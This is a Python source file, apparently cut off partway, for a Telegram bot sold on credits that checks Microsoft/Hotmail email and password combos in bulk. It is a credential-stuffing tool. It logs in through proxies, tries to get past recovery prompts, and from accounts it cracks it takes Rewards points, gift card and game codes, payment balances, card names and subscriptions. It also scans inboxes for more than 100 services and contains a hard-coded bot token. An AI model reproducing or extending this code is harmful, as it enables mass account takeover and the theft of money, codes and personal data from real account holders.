#!/usr/bin/env python3
"""
@larpsupport — AKAZA Hotmail Checker Bot
Full flux.py login (high CPM) + Rewards + Codes + Keyword Inbox Scan
Railway ready | No GUI | No CLI menus
"""

import re, json, uuid, sqlite3, logging, asyncio, time, os, random, threading
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
import requests, urllib3
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ============================================================================
# CONFIG
# ============================================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8544623193:AAGB5p8qqnkPbsmolPkKVpAGW7XmWdmFOak")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "5944410248"))
DB_PATH = os.environ.get("DB_PATH", "checker.db")

# flux.py exact login URL — DO NOT CHANGE
SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

PROXIES_LIST: list = []
db_lock = threading.Lock()
bot_executor = ThreadPoolExecutor(max_workers=500)
user_fast_mode: dict = {}  # uid -> bool

TAG = "@larpsupport"
BANNER = f"🔥 AKAZA | {TAG}"

# ============================================================================
# EXCLUDE WORDS — from flux.py
# ============================================================================
EXCLUDE_WORDS = {
    'SWEEPSTAKES','STATUS','WINORDER','CONTEST','PLAGUE','REQUIEM',
    'CUSTOM','BUNDLEORDER','SURFACE','PROORDER','SERIES','POINTS',
    'DONATION','CHILDREN','RESEARCH','HOSPITALORDE','EDUCATION',
    'EMPLOYMENTOR','RIGHTS','YOUORDER','SEDSORDER','ATAORDER',
    'CARDORDER','MICROSOFT','PRESENTKORT','KRORDER','OFT-PRE',
    'DIGITAL','COINSORDER','MOEDAS','OVERWATCHORD','MONEDASORDER',
    'ASSINATURA','GRATUITA','SPOTIFY','PREMIUM','MESESORDER',
    'PRESENTE','RESALET','NOURORDER','FOUNDATIONOR','YACOUB',
    'LEAGUE','LEGENDS','RPORDER','OVERWATCH','GAME','PASS',
    'MINECOINS','ROBUX','GIFT','CARD','ORDER','CODE','FOUND',
    'DIGITAL-CODE','REDEMPTION','REDEEM','DOWNLOAD','INSTANT',
    'DELIVERY','ONLINE','ACCESS','CONTENT','DLC','EXPANSION',
    'SEASON','TOKEN','CURRENCY','VIRTUAL','ITEM'
}

# ============================================================================
# SERVICE KEYWORDS — 100+ services for inbox scan
# ============================================================================
SERVICE_KEYWORDS = {
    # Social
    "instagram.com": "Instagram", "mail.instagram.com": "Instagram",
    "facebook.com": "Facebook", "facebookmail.com": "Facebook",
    "twitter.com": "Twitter/X", "x.com": "Twitter/X",
    "tiktok.com": "TikTok", "account.tiktok": "TikTok",
    "snapchat.com": "Snapchat",
    "discord.com": "Discord", "discordapp.com": "Discord",
    "telegram.org": "Telegram",
    "reddit.com": "Reddit",
    "linkedin.com": "LinkedIn", "e.linkedin.com": "LinkedIn",
    "twitch.tv": "Twitch",
    "onlyfans.com": "OnlyFans",
    "patreon.com": "Patreon",
    "vk.com": "VK",
    "whatsapp.com": "WhatsApp",
    "youtube.com": "YouTube",
    "pinterest.com": "Pinterest",
    "tumblr.com": "Tumblr",
    # Streaming
    "netflix.com": "Netflix", "info@netflix.com": "Netflix",
    "spotify.com": "Spotify",
    "disneyplus.com": "Disney+",
    "hulu.com": "Hulu",
    "hbo.com": "HBO Max", "hbomax.com": "HBO Max",
    "primevideo.com": "Prime Video",
    "peacocktv.com": "Peacock",
    "paramountplus.com": "Paramount+",
    "tidal.com": "Tidal",
    "deezer.com": "Deezer",
    "soundcloud.com": "SoundCloud",
    "apple.com/music": "Apple Music",
    # Gaming
    "xbox.com": "Xbox", "xboxlive.com": "Xbox",
    "playstation.com": "PlayStation", "sony@txn-email.playstation.com": "PlayStation",
    "nintendo.com": "Nintendo",
    "steampowered.com": "Steam", "noreply@steampowered.com": "Steam",
    "epicgames.com": "Epic Games",
    "riotgames.com": "Riot Games",
    "ubisoft.com": "Ubisoft",
    "ea.com": "EA",
    "blizzard.com": "Blizzard",
    "minecraft.net": "Minecraft",
    "roblox.com": "Roblox",
    "garena.com": "Garena",
    "rockstargames.com": "Rockstar",
    "bethesda.net": "Bethesda",
    "capcom.com": "Capcom",
    "square-enix.com": "Square Enix",
    "bandainamco.com": "Bandai Namco",
    "noreply@id.supercell.com": "Supercell", "supercell.com": "Supercell",
    # Finance
    "paypal.com": "PayPal",
    "venmo.com": "Venmo",
    "cash.app": "CashApp",
    "stripe.com": "Stripe",
    "revolut.com": "Revolut",
    "wise.com": "Wise",
    "coinbase.com": "Coinbase",
    "binance.com": "Binance",
    "kraken.com": "Kraken",
    "robinhood.com": "Robinhood",
    "blockchain.com": "Blockchain",
    # Shopping
    "amazon.com": "Amazon",
    "ebay.com": "eBay",
    "aliexpress.com": "AliExpress",
    "etsy.com": "Etsy",
    "walmart.com": "Walmart",
    "target.com": "Target",
    "shopify.com": "Shopify",
    "nike.com": "Nike",
    "adidas.com": "Adidas",
    # Food
    "ubereats.com": "Uber Eats",
    "doordash.com": "DoorDash",
    "grubhub.com": "GrubHub",
    "deliveroo.com": "Deliveroo",
    # Travel
    "uber.com": "Uber",
    "lyft.com": "Lyft",
    "airbnb.com": "Airbnb",
    "booking.com": "Booking",
    "expedia.com": "Expedia",
    # Cloud
    "dropbox.com": "Dropbox",
    "icloud.com": "iCloud",
    # VPN
    "nordvpn.com": "NordVPN",
    "expressvpn.com": "ExpressVPN",
    "surfshark.com": "Surfshark",
    "protonvpn.com": "ProtonVPN",
    # Education
    "coursera.org": "Coursera",
    "udemy.com": "Udemy",
    "duolingo.com": "Duolingo",
    "grammarly.com": "Grammarly",
    # Productivity
    "adobe.com": "Adobe",
    "canva.com": "Canva",
    "zoom.us": "Zoom",
    "slack.com": "Slack",
    "notion.so": "Notion",
}

# ============================================================================
# DATABASE
# ============================================================================
class AkazaDatabase:
    def __init__(self, db_path):
        self.db_path = db_path
        self.init_db()

    def conn(self):
        return sqlite3.connect(self.db_path, check_same_thread=False)

    def init_db(self):
        with self.conn() as c:
            c.execute("""CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT, first_name TEXT,
                credits INTEGER DEFAULT 0,
                has_access INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0,
                is_mod INTEGER DEFAULT 0,
                total_checks INTEGER DEFAULT 0,
                total_hits INTEGER DEFAULT 0,
                join_date TEXT,
                access_expiry TEXT
            )""")
            c.execute("""CREATE TABLE IF NOT EXISTS settings (
                user_id INTEGER PRIMARY KEY,
                keywords TEXT DEFAULT '[]',
                threads INTEGER DEFAULT 10
            )""")
            c.execute("""CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER, email TEXT, status TEXT,
                details TEXT, date TEXT
            )""")
        logger.info("Database initialized")

    def add_user(self, uid, username, first_name):
        with self.conn() as c:
            c.execute("""INSERT OR IGNORE INTO users
                (user_id, username, first_name, join_date)
                VALUES (?,?,?,?)""",
                (uid, username or '', first_name or '',
                 datetime.now().isoformat()))
            c.execute("""INSERT OR IGNORE INTO settings
                (user_id) VALUES (?)""", (uid,))

    def is_banned(self, uid):
        if uid == ADMIN_ID: return False
        with self.conn() as c:
            r = c.execute("SELECT is_banned FROM users WHERE user_id=?", (uid,)).fetchone()
            return bool(r and r[0])

    def has_access(self, uid):
        if uid == ADMIN_ID: return True
        with self.conn() as c:
            r = c.execute(
                "SELECT has_access, is_banned, access_expiry FROM users WHERE user_id=?",
                (uid,)).fetchone()
            if not r: return False
            has, banned, expiry = r
            if banned: return False
            if not has: return False
            if expiry:
                try:
                    if datetime.fromisoformat(expiry) < datetime.now():
                        c.execute("UPDATE users SET has_access=0 WHERE user_id=?", (uid,))
                        return False
                except: pass
            return True

    def is_mod(self, uid):
        if uid == ADMIN_ID: return True
        with self.conn() as c:
            r = c.execute("SELECT is_mod FROM users WHERE user_id=?", (uid,)).fetchone()
            return bool(r and r[0])

    def get_credits(self, uid):
        if uid == ADMIN_ID: return 999999
        with self.conn() as c:
            r = c.execute("SELECT credits FROM users WHERE user_id=?", (uid,)).fetchone()
            return r[0] if r else 0

    def add_credits(self, uid, amount):
        with self.conn() as c:
            c.execute("UPDATE users SET credits=credits+? WHERE user_id=?", (amount, uid))

    def set_credits(self, uid, amount):
        with self.conn() as c:
            c.execute("UPDATE users SET credits=? WHERE user_id=?", (amount, uid))

    def reset_credits(self, uid):
        self.set_credits(uid, 0)

    def use_credit(self, uid):
        if uid == ADMIN_ID: return
        with self.conn() as c:
            c.execute("UPDATE users SET credits=MAX(0,credits-1), total_checks=total_checks+1 WHERE user_id=?", (uid,))

    def add_hit(self, uid):
        with self.conn() as c:
            c.execute("UPDATE users SET total_hits=total_hits+1 WHERE user_id=?", (uid,))

    def grant_access(self, uid):
        with self.conn() as c:
            c.execute("UPDATE users SET has_access=1, access_expiry=NULL WHERE user_id=?", (uid,))

    def revoke_access(self, uid):
        with self.conn() as c:
            c.execute("UPDATE users SET has_access=0 WHERE user_id=?", (uid,))

    def grant_timed_access(self, uid, days):
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        with self.conn() as c:
            c.execute("UPDATE users SET has_access=1, access_expiry=? WHERE user_id=?", (expiry, uid))

    def ban(self, uid):
        with self.conn() as c:
            c.execute("UPDATE users SET is_banned=1 WHERE user_id=?", (uid,))

    def unban(self, uid):
        with self.conn() as c:
            c.execute("UPDATE users SET is_banned=0 WHERE user_id=?", (uid,))

    def set_mod(self, uid, val):
        with self.conn() as c:
            c.execute("UPDATE users SET is_mod=? WHERE user_id=?", (val, uid))

    def get_all_user_ids(self):
        with self.conn() as c:
            return [r[0] for r in c.execute("SELECT user_id FROM users").fetchall()]

    def get_user_info(self, uid):
        with self.conn() as c:
            r = c.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
            if not r: return None
            cols = ['user_id','username','first_name','credits','has_access',
                    'is_banned','is_mod','total_checks','total_hits','join_date','access_expiry']
            return dict(zip(cols, r))

    def get_user_settings(self, uid):
        with self.conn() as c:
            r = c.execute("SELECT keywords, threads FROM settings WHERE user_id=?", (uid,)).fetchone()
            if not r: return {'keywords': [], 'threads': 10}
            try: kws = json.loads(r[0]) if r[0] else []
            except: kws = []
            return {'keywords': kws, 'threads': r[1] or 10}

    def update_settings(self, uid, keywords=None, threads=None):
        s = self.get_user_settings(uid)
        if keywords is not None: s['keywords'] = keywords
        if threads is not None: s['threads'] = threads
        with self.conn() as c:
            c.execute("INSERT OR REPLACE INTO settings (user_id, keywords, threads) VALUES (?,?,?)",
                      (uid, json.dumps(s['keywords']), s['threads']))

    def save_result(self, uid, email, status, details):
        with self.conn() as c:
            c.execute("INSERT INTO results (user_id, email, status, details, date) VALUES (?,?,?,?,?)",
                      (uid, email, status, json.dumps(details), datetime.now().isoformat()))

    def user_stats(self, uid):
        info = self.get_user_info(uid)
        if not info: return {'credits': 0, 'checks': 0, 'hits': 0}
        return {'credits': info['credits'], 'checks': info['total_checks'], 'hits': info['total_hits']}

    def get_global_stats(self):
        with self.conn() as c:
            total = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            active = c.execute("SELECT COUNT(*) FROM users WHERE has_access=1 AND is_banned=0").fetchone()[0]
            checks = c.execute("SELECT SUM(total_checks) FROM users").fetchone()[0] or 0
            hits = c.execute("SELECT SUM(total_hits) FROM users").fetchone()[0] or 0
            return {'total': total, 'active': active, 'checks': checks, 'hits': hits}

    def list_mods(self):
        with self.conn() as c:
            rows = c.execute("SELECT user_id, username FROM users WHERE is_mod=1").fetchall()
            return [{'uid': r[0], 'username': r[1]} for r in rows]

db = AkazaDatabase(DB_PATH)

# ============================================================================
# CHECKER — flux.py login engine
# ============================================================================
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                'AppleWebKit/537.36 (KHTML, like Gecko) '
                'Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        })
        if proxy:
            p = self._fmt_proxy(proxy)
            self.session.proxies = {'http': p, 'https': p}

    def _fmt_proxy(self, proxy):
        proxy = proxy.strip()
        if proxy.startswith(('http://', 'https://', 'socks')):
            return proxy
        parts = proxy.split(':')
        if len(parts) == 4:
            ip, port, user, pwd = parts
            return f'http://{user}:{pwd}@{ip}:{port}'
        return f'http://{proxy}'

    # ------------------------------------------------------------------
    # STEP 1 — get PPFT token and urlPost (exact from flux.py)
    # ------------------------------------------------------------------
    def get_sftag_params(self):
        for _ in range(3):
            try:
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                        'AppleWebKit/537.36 (KHTML, like Gecko) '
                        'Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
                text = self.session.get(SFTAG_URL, headers=headers,
                                        timeout=10, verify=False).text
                ppft_match = (
                    re.search(r'value=\\\\"(.+?)\\\\"', text, re.S) or
                    re.search(r'value="(.+?)"', text, re.S) or
                    re.search(r"sFTTag:'(.+?)'", text, re.S) or
                    re.search(r'sFTTag:"(.+?)"', text, re.S) or
                    re.search(r'name="PPFT".*?value="(.+?)"', text, re.S)
                )
                if ppft_match:
                    ppft = ppft_match.group(1)
                    url_match = (
                        re.search(r'"urlPost":"(.+?)"', text, re.S) or
                        re.search(r"urlPost:'(.+?)'", text, re.S) or
                        re.search(r'<form.*?action="(.+?)"', text, re.S)
                    )
                    if url_match:
                        url_post = url_match.group(1).replace('&amp;', '&')
                        return url_post, ppft
            except Exception:
                pass
            time.sleep(0.1)
        return None, None

    # ------------------------------------------------------------------
    # STEP 2 — login (exact from flux.py get_xbox_rps)
    # ------------------------------------------------------------------
    def do_login(self, email, password, url_post, ppft):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email,
                        'passwd': password, 'PPFT': ppft}
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                        'AppleWebKit/537.36 (KHTML, like Gecko) '
                        'Chrome/91.0.4472.124 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'close'
                }
                resp = self.session.post(url_post, data=data, headers=headers,
                                         allow_redirects=True, timeout=10, verify=False)

                # SUCCESS — token in URL fragment
                if '#' in resp.url and resp.url != SFTAG_URL:
                    token = parse_qs(urlparse(resp.url).fragment).get(
                        'access_token', ['None'])[0]
                    if token and token != 'None':
                        return 'TOKEN', token

                # 2FA recovery flow
                elif 'cancel?mkt=' in resp.text:
                    try:
                        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text)
                        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text)
                        if ipt and pprid and uaid:
                            d2 = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text)
                            if action:
                                r2 = self.session.post(action.group(), data=d2,
                                                       allow_redirects=True, timeout=10, verify=False)
                                return_url = re.search(
                                    r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', r2.text)
                                if return_url:
                                    fin = self.session.get(return_url.group(),
                                                           allow_redirects=True, timeout=10, verify=False)
                                    token = parse_qs(urlparse(fin.url).fragment).get(
                                        'access_token', ['None'])[0]
                                    if token and token != 'None':
                                        return 'TOKEN', token
                    except Exception:
                        pass
                    return '2FA', None

                # 2FA indicators
                elif any(v in resp.text for v in [
                    'recover?mkt', 'account.live.com/identity/confirm?mkt',
                    'Email/Confirm?mkt', '/Abuse?mkt='
                ]):
                    return '2FA', None

                # Wrong password / account doesn't exist
                elif any(v in resp.text.lower() for v in [
                    'password is incorrect', "account doesn't exist",
                    "that microsoft account doesn't exist",
                    'sign in to your microsoft account',
                    'tried to sign in too many times',
                    'help us protect your account'
                ]):
                    return 'BAD', None

            except Exception:
                pass
            time.sleep(0.1)
        return 'BAD', None

    # ------------------------------------------------------------------
    # Handle fmHF form redirects
    # ------------------------------------------------------------------
    def _handle_fmhf(self, resp):
        for _ in range(5):
            try:
                soup = BeautifulSoup(resp.text, 'html.parser')
                form = soup.find('form', id='fmHF')
                if not form: break
                action = form.get('action', '')
                if not action: break
                if action.startswith('/'):
                    action = 'https://login.live.com' + action
                form_data = {inp.get('name'): inp.get('value', '')
                             for inp in form.find_all('input') if inp.get('name')}
                resp = self.session.post(action, data=form_data,
                                         allow_redirects=True, timeout=10, verify=False)
            except Exception:
                break
        return resp

    # ------------------------------------------------------------------
    # Rewards Points (3-method fallback from p7.py)
    # ------------------------------------------------------------------
    def get_rewards_points(self):
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Referer': 'https://rewards.bing.com/',
            'Accept': 'application/json, text/plain, */*',
        }
        # Method 1
        try:
            r = self.session.get('https://rewards.bing.com/api/getuserinfo',
                                  headers=headers, timeout=8, verify=False)
            data = r.json()
            pts = (data.get('availablePoints') or
                   data.get('dashboard', {}).get('userStatus', {}).get('availablePoints'))
            if pts is not None and 0 <= int(pts) <= 500000:
                return int(pts)
        except Exception:
            pass
        # Method 2
        try:
            r = self.session.get('https://www.bing.com/rewardsapp/flyoutHub?format=json',
                                  headers=headers, timeout=8, verify=False)
            pts = r.json().get('userInfo', {}).get('balance')
            if pts is not None and 0 <= int(pts) <= 500000:
                return int(pts)
        except Exception:
            pass
        # Method 3 — scrape page
        try:
            r = self.session.get('https://rewards.bing.com',
                                  headers=headers, timeout=10, verify=False)
            if 'fmHF' in r.text:
                r = self._handle_fmhf(r)
            m = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
            if m:
                pts = int(m.group(1))
                if 0 <= pts <= 500000:
                    return pts
        except Exception:
            pass
        return 0

    # ------------------------------------------------------------------
    # Redemption Codes (exact from flux.py)
    # ------------------------------------------------------------------
    def get_redemption_codes(self):
        codes_found = []
        try:
            url = 'https://rewards.bing.com/redeem/orderhistory'
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0',
                'Referer': 'https://rewards.bing.com/',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            r = self.session.get(url, headers=headers, timeout=10, verify=False)
            text = r.text

            # Handle JS redirect
            if 'fmHF' in text or 'JavaScript required' in text:
                soup0 = BeautifulSoup(text, 'html.parser')
                form = soup0.find('form', id='fmHF') or soup0.find('form', attrs={'name': 'fmHF'})
                if form and form.get('action'):
                    action = form['action']
                    if action.startswith('/'):
                        action = 'https://login.live.com' + action
                    form_data = {inp.get('name'): inp.get('value', '')
                                 for inp in form.find_all('input') if inp.get('name')}
                    self.session.post(action, data=form_data, timeout=10,
                                      verify=False, allow_redirects=True)
                    r2 = self.session.get(url, headers=headers, timeout=10,
                                          verify=False, allow_redirects=True)
                    text = r2.text

            soup = BeautifulSoup(text, 'html.parser')

            # Extract verification token
            ver_token = ''
            ti = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            if ti and ti.get('value'):
                ver_token = ti['value']

            CODE_PATTERNS = [
                r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',
                r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',
                r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b',
            ]

            table = soup.find('table', class_='table')
            rows = []
            if table and table.tbody:
                rows = table.tbody.find_all('tr')
            elif table:
                rows = table.find_all('tr')

            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3:
                    continue
                full_row_text = row.get_text(strip=True)
                order_title = cells[2].get_text(strip=True) if len(cells) > 2 else ''
                order_date = cells[1].get_text(strip=True) if len(cells) > 1 else ''
                detected_cat = self._detect_category(order_title, full_row_text)

                get_code_btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if get_code_btn:
                    action_url = get_code_btn.get('data-actionurl', '').replace('&amp;', '&')
                    if action_url.startswith('/'):
                        action_url = 'https://rewards.bing.com' + action_url
                    try:
                        post_data = {}
                        if ver_token:
                            post_data['__RequestVerificationToken'] = ver_token
                        code_headers = {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.0.0',
                            'X-Requested-With': 'XMLHttpRequest',
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        }
                        code_resp = self.session.post(action_url, data=post_data,
                                                      headers=code_headers, timeout=10, verify=False)
                        code_html = code_resp.text
                        code_soup = BeautifulSoup(code_html, 'html.parser')
                        code = None

                        # Extraction method a — tango credential key/value
                        rs = code_soup.find('div', class_='resendSuccess')
                        if rs:
                            keys = rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I))
                            vals = rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))
                            for k, v in zip(keys, vals):
                                kt = k.get_text(strip=True).upper()
                                if 'CODE' in kt or 'PIN' in kt:
                                    candidate = v.get_text(strip=True)
                                    if '*' not in candidate:
                                        code = candidate
                                        break

                        # Method b — regex patterns
                        if not code:
                            for pat in CODE_PATTERNS:
                                m = re.search(pat, code_html)
                                if m:
                                    candidate = m.group(0)
                                    if '*' not in candidate and candidate not in EXCLUDE_WORDS:
                                        code = candidate
                                        break

                        # Method c — PIN: pattern
                        if not code:
                            m = re.search(r'PIN\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})',
                                          code_html, re.I)
                            if m and '*' not in m.group(1):
                                code = m.group(1)

                        # Method d — CODE: pattern
                        if not code:
                            m = re.search(r'CODE\s*:\s*([A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4})',
                                          code_html, re.I)
                            if m and '*' not in m.group(1):
                                code = m.group(1)

                        # Method e — pre/code tags
                        if not code:
                            for tag in code_soup.find_all(['pre', 'code']):
                                t = tag.get_text(strip=True)
                                for pat in CODE_PATTERNS:
                                    if re.match(pat, t) and '*' not in t:
                                        code = t
                                        break
                                if code: break

                        # Method f — clipboard button
                        if not code:
                            for btn in code_soup.find_all('button',
                                                          attrs={'data-clipboard-text': True}):
                                val = btn['data-clipboard-text'].strip()
                                if val and len(val) >= 15 and '*' not in val:
                                    code = val
                                    break

                        # Method g — generic fallback
                        if not code:
                            all_c = re.findall(
                                r'[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}'
                                r'(?:-[A-Z0-9]{4})?(?:-[A-Z0-9]{4})?',
                                code_html)
                            for c in all_c:
                                if '*' not in c and c not in EXCLUDE_WORDS:
                                    code = c
                                    break

                        # Redemption URL (gift cards)
                        redemption_url = ''
                        ci = self._code_info(order_title, detected_cat, full_row_text)
                        if any(x in ci.lower() for x in ['gift', 'card', '$', 'amazon', 'spotify']):
                            url_pats = [
                                r"<div class=['\"]tango-credential-key['\"]><a href=['\"]([^'\"]*)['\"][^>]*>Redemption URL</a></div>",
                                r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>',
                                r'<a[^>]*href="([^"]*)"[^>]*>Redeem</a>',
                                r'href="([^"]*redeem[^"]*)"',
                                r'Redemption URL:\s*(https?://[^\s<>"\']+)',
                            ]
                            for up in url_pats:
                                um = re.search(up, code_html, re.I | re.DOTALL)
                                if um:
                                    redemption_url = um.group(1).strip()
                                    break

                        if code:
                            codes_found.append({
                                'code': code,
                                'category': detected_cat,
                                'info': ci,
                                'redemption_url': redemption_url,
                                'date': order_date or datetime.now().strftime('%Y-%m-%d')
                            })
                    except Exception:
                        continue
                else:
                    # Fallback — text search in cells
                    code_cell = cells[3] if len(cells) > 3 else cells[2]
                    code_text = code_cell.get_text(strip=True).upper()
                    for pat in CODE_PATTERNS:
                        for c in re.findall(pat, code_text):
                            if '*' in c or c in EXCLUDE_WORDS:
                                continue
                            parts = c.split('-')
                            if len(parts) < 3: continue
                            codes_found.append({
                                'code': c,
                                'category': detected_cat,
                                'info': self._code_info(order_title, detected_cat, full_row_text),
                                'redemption_url': '',
                                'date': order_date or datetime.now().strftime('%Y-%m-%d')
                            })

            # No table — search whole page
            if not rows:
                all_text = soup.get_text().upper()
                for pat in CODE_PATTERNS:
                    for c in re.findall(pat, all_text):
                        if '*' in c or c in EXCLUDE_WORDS: continue
                        if sum(ch.isalnum() for ch in c.replace('-', '')) < 8: continue
                        codes_found.append({
                            'code': c, 'category': 'Unknown',
                            'info': 'CODE FOUND', 'redemption_url': '', 'date': ''
                        })

        except Exception as e:
            logger.debug(f"Code fetch error: {e}")
        return codes_found

    def _detect_category(self, title, row_text=''):
        t = (row_text or title).lower()
        if any(k in t for k in ['overwatch', 'owl tokens']): return 'Overwatch'
        if any(k in t for k in ['sea of thieves', 'ancient coins', 'alijo secreto']): return 'Sea of Thieves'
        if any(k in t for k in ['roblox', 'robux']): return 'Roblox'
        if any(k in t for k in ['league of legends', 'riot points', 'puntos riot']): return 'League of Legends'
        if any(k in t for k in ['game pass', 'gamepass', 'xbox game pass']): return 'Game Pass'
        if any(k in t for k in ['minecraft', 'minecoins', 'monedas minecraft']): return 'Minecraft'
        if any(k in t for k in ['gift card', 'giftcard', 'amazon', 'steam gift',
                                  'playstation', 'nintendo gift', 'target', 'starbucks',
                                  'subway', 'doordash', 'uber', 'walmart', 'spotify premium']): return 'Gift Card'
        return 'Unknown'

    def _code_info(self, title, category, row_text=''):
        t = title.lower()
        if category == 'Minecraft':
            m = re.search(r'(\d+)\s*(?:minecoins|coins)', t)
            return f"{m.group(1)} MINECOINS" if m else "MINECRAFT CODE"
        if category == 'Roblox':
            m = re.search(r'(\d+)\s*(?:robux|rbx)', t)
            return f"{m.group(1)} ROBUX" if m else "ROBLOX CODE"
        if category == 'League of Legends':
            m = re.search(r'(\d+)\s*(?:rp|riot)', t)
            return f"{m.group(1)} RP" if m else "LOL CODE"
        if category == 'Game Pass':
            m = re.search(r'(\d+)\s*month', t)
            return f"{m.group(1)} MONTH GAME PASS" if m else "GAME PASS CODE"
        if category == 'Gift Card':
            m = re.search(r'\$(\d+)', t)
            amt = f"${m.group(1)} " if m else ""
            for x in ['amazon', 'steam', 'playstation', 'xbox', 'nintendo',
                       'target', 'starbucks', 'subway', 'doordash', 'uber', 'walmart']:
                if x in t: return f"{amt}{x.upper()} GIFT CARD"
            return f"{amt}GIFT CARD"
        return f"{category.upper()} CODE"

    # ------------------------------------------------------------------
    # Microsoft Subscriptions (from hit.py)
    # ------------------------------------------------------------------
    def get_microsoft_subs(self):
        result = {'status': 'FREE', 'subs': [], 'balance': '', 'card': ''}
        try:
            uid16 = uuid.uuid4().hex[:16]
            state = json.dumps({"userId": uid16, "scopeSet": "pidl"})
            silent_url = (
                "https://login.live.com/oauth20_authorize.srf"
                "?client_id=000000000004773A"
                "&response_type=token"
                "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                f"&redirect_uri=https://account.microsoft.com/auth/complete-silent-delegate-auth"
                f"&state={quote(state)}&prompt=none"
            )
            r = self.session.get(silent_url, headers={'Referer': 'https://account.microsoft.com/'},
                                  allow_redirects=True, timeout=15, verify=False)
            pay_token = None
            for pat in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                m = re.search(pat, r.text + ' ' + r.url)
                if m:
                    pay_token = unquote(m.group(1))
                    break
            if not pay_token:
                return result
            pay_hdrs = {
                'Authorization': f'MSADELEGATE1.0="{pay_token}"',
                'ms-cV': str(uuid.uuid4()),
                'Origin': 'https://account.microsoft.com',
                'Referer': 'https://account.microsoft.com/',
                'Accept': 'application/json',
            }
            # Balance
            try:
                rp = self.session.get(
                    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/'
                    'paymentInstrumentsEx?status=active,removed&language=en-US',
                    headers=pay_hdrs, timeout=12, verify=False)
                bm = re.search(r'"balance"\s*:\s*([0-9.]+)', rp.text)
                if bm: result['balance'] = f"${bm.group(1)}"
                cm = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"',
                               rp.text, re.DOTALL)
                if cm: result['card'] = cm.group(1)
            except Exception:
                pass
            # Subscriptions
            try:
                rs = self.session.get(
                    'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions',
                    headers=pay_hdrs, timeout=12, verify=False)
                sub_kw = {
                    'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                    'PC Game Pass': 'PC GAME PASS',
                    'Xbox Game Pass': 'GAME PASS',
                    'EA Play': 'EA PLAY',
